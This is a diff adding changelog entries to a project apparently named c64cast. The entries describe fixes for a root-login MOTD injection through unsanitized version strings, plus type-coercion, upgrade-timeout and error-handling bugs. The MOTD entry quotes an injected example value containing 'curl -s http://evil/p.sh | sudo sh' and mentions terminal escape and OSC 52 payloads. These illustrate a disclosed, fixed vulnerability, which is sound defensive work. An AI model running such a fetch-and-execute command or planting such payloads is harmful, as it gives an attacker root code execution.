@@ -172,6 +172,41 @@ in practice not read at all. Releases that ask nothing of anyone leave it out.
   granted every holder of the "read-only" link start, stop, config writes
   and media upload. The refusal names the reason and exits `2` instead of
   raising a `ValueError` out of the middle of a FastAPI app build.
+- **The appliance's login MOTD rendered two unsanitized strings from a file
+  a lower-privileged account owns.**
+  `packaging/systemd/c64cast-update-check.service` writes
+  `update_check.json` as the unprivileged `c64cast` account, while
+  `packaging/motd/98-c64cast-update` prints `c64cast --motd-line` from
+  `/etc/update-motd.d/`, which pam_motd runs as **root** at every login —
+  and the unit's own comment requires both surfaces to resolve the same
+  file, so the working configuration is precisely the one where a
+  low-privilege account owns a file root reads. `read_update_state` coerced
+  `running_version` and `latest_version` with a bare `str()`, imposing no
+  charset or length constraint, and both were interpolated straight into
+  that line: a `"latest_version"` of `"0.5.0\nSECURITY: apply the hotfix
+  now: curl -s http://evil/p.sh | sudo sh\n"` rendered as an additional,
+  official-looking MOTD line at every root login, and ESC/OSC payloads went
+  further — erasing or rewriting the surrounding banner, and on terminals
+  honoring OSC 52 writing the admin's clipboard. Both fields must now match
+  a plausible version token, which is also the gate `upgrade.latest_release`
+  applies to PyPI's own answer, so nothing shaped unlike a version is ever
+  written or read back. (The web console was never affected — it binds these
+  values as text nodes, so the terminal is the one sink that acts on control
+  bytes.)
+- Every field of `update_check.json` is now type-checked on read instead of
+  coerced, because `float()`, `bool()` and `str()` cannot fail and so turned
+  a mistyped field into a confident wrong answer rather than the routine
+  "nothing recorded yet". `"newer": "false"` read back as `True` —
+  `bool("false")` is truthy — and `rechecked()` could not correct it, since
+  a record whose `running_version` already matches is returned untouched, so
+  the login banner offered the release the box already ran. A `checked_at`
+  of `NaN` or `Infinity` (both of which `json.loads` accepts as bare
+  literals) made *every* comparison in `is_stale` read as "not stale", which
+  disabled the one safeguard against quoting a dead answer — permanently and
+  with no other symptom, so an internet-facing appliance that had missed a
+  year of releases said nothing about it at either surface. `is_stale` now
+  also treats a date more than a day in the future as stale rather than
+  fresh: "can't tell how old this is" is not "recent".
 
 ### Fixed
 
@@ -360,6 +395,66 @@ in practice not read at all. Releases that ask nothing of anyone leave it out.
   the tables the layer supplied instead of only a field count, because "(4
   fields)" cannot tell an operator that this is the layer which turned a
   network switch on.
+- **`--upgrade` could kill an install partway through and leave a broken
+  one.** Every install command ran under a 120-second ceiling, and
+  `subprocess.run` SIGKILLs the child when that expires — so a `uv sync
+  --all-extras` or `pip install --upgrade c64cast` resolving a release that
+  moved an `opencv-python`/PyAV/numpy pin (≈100 MB to download, or a source
+  build on a Pi-class host with no matching wheel) was killed while
+  replacing `site-packages`, by the one command whose purpose is repairing
+  an install, with no flag or variable to raise the limit. The ceiling is
+  now an hour and `$C64CAST_UPGRADE_TIMEOUT_S` overrides it (`0` removes it
+  entirely); a command that does hit it is sent SIGINT first — the signal
+  uv/pip/pipx/git already unwind cleanly from — and killed only if it
+  ignores that; and the message says the upgrade may be only partly applied
+  and names the variable. The read-only `git status` probe keeps its own
+  short timeout, since it mutates nothing.
+- `--upgrade` on a source tree with no `.git` — an unpacked release archive,
+  which carries the `pyproject.toml` the checkout verdict is read from — now
+  says so, instead of reporting "could not be checked (is git on PATH?)" and
+  "Commit or stash first" and sending the user off to fix a `PATH` that was
+  never the problem in a directory holding no repository. The checkout
+  branch also refuses up front when `uv` is missing rather than discovering
+  it after `git pull` has already moved the source, which used to leave the
+  tree on new code with the old dependency set; and an unverifiable tree now
+  gets its own wording rather than borrowing the dirty tree's advice.
+- `--check-for-updates` and `--doctor` could traceback instead of reporting
+  "couldn't check". `upgrade.latest_release` is documented "never raises",
+  but a PyPI body decoding to a list, a string, a number, `null`, or
+  `{"info": null}` raised `TypeError` from its subscript chain, and its lazy
+  `import requests` sat outside the guard, so a half-installed `requests` —
+  the state an upgrade exists to fix — raised `ImportError` through it. A
+  mis-shaped body could also produce a *fabricated* answer that nothing
+  downstream could catch: `str()` turned `{"info": {"version": 5}}` into the
+  release `"5"`, which compares newer than everything this project has
+  published, and `{"info": {"version": null}}` into `"None"`, which cleared
+  the recorded `unanswered_since` and discarded the previous real answer.
+  The failure is now caught broadly and logged at debug, so `-vv`
+  distinguishes a DNS failure from a proxy's 403 from a shape change instead
+  of collapsing all of them into the same silent `None`.
+- `--check-for-updates --write-state` tracebacked, and threw away the
+  network answer it already held, when the data root could not be written —
+  read-only (`$C64CAST_DATA_DIR` into a squashfs), full, or with a directory
+  planted where `update_check.json` belongs, which `os.replace` cannot
+  rename over. `record_check` now warns and carries on, so the answer still
+  prints and `c64cast-update-check.service` still exits within the
+  `SuccessExitStatus` it enumerates. A non-UTF-8 `update_check.json` also
+  raised `UnicodeDecodeError` out of `read_update_state` (guarded by `except
+  OSError`, and a decode error is a `ValueError`) into both readers,
+  including the script that runs at every SSH login — and because
+  `record_check` reads before it writes, the run that would have replaced
+  the bad file died first and the slot could never repair itself.
+- `--upgrade` reported a `uv/tools`-shaped install for a hand-made pip venv
+  that merely sat under a directory called `tools` beside one called `uv`
+  (likewise `pipx`/`venvs`), and printed the wrong installer's command:
+  those segments are now matched as adjacent path components, which is what
+  the documentation always said. `--upgrade` also launches the binary
+  `shutil.which` resolved rather than handing the unqualified name back to
+  `exec` to re-resolve `PATH`, and the login MOTD's staleness line says no
+  update check has *succeeded* in over 30 days rather than blaming PyPI for
+  not answering — on a machine with no timer the last attempt did answer and
+  nobody has asked since, so the old wording sent an admin hunting a network
+  fault that did not exist.
 
 ### Changed
 
